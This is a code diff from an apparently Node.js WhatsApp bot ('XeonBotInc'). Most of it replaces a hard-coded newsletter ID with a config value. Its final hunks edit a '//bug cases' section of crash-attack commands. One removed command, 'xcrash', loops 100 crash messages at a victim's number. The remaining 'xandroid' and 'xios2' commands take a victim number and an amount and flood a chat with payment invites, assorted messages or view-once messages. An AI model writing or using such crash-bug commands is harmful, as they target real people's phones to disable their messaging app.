                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24194,7 +24231,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24349,7 +24386,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -24483,7 +24520,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24564,7 +24601,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24716,7 +24753,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -24850,7 +24887,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -24931,7 +24968,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25081,7 +25118,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -25215,7 +25252,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25296,7 +25333,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25452,7 +25489,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -25586,7 +25623,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25667,7 +25704,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -25830,7 +25867,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: global.xchannel.jid,
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -25964,7 +26001,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -26045,7 +26082,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: global.xchannel.jid,
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -26063,18 +26100,6 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 
  //bug cases
- case 'xcrash':{
-if (!XeonTheCreator) return
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
- victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-XeonyCrashy(pushname,victim)
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
 case "xandroid": {
   if (!XeonTheCreator) return
   if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
@@ -26154,7 +26179,7 @@ case "xios2":
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     replygcxeon("please wait, " + command + " bug is in process..");
     await sleep(1500); // Adjusted sleep time for clarity
-    sendMultiplePaymentInvites(from, encodedValue);
+    sendMultiplePaymentInvites(m.chat, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
@@ -26174,7 +26199,7 @@ case "xios2":
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     replygcxeon("please wait, " + command + " bug is in process..");
     await sleep(1500); // Adjusted sleep time for clarity
-    sendVariousMessages(from, encodedValue);
+    sendVariousMessages(m.chat, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
@@ -26218,7 +26243,7 @@ case "xios2":
     let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
     replygcxeon("please wait, " + command + " bug is in process..");
     await sleep(1500); // Adjusted sleep time for clarity
-    sendViewOnceMessages(from, encodedValue);
+    sendViewOnceMessages(m.chat, encodedValue);
     await sleep(2500); // Adjusted sleep time for clarity
     sendReaction('✅');
   }
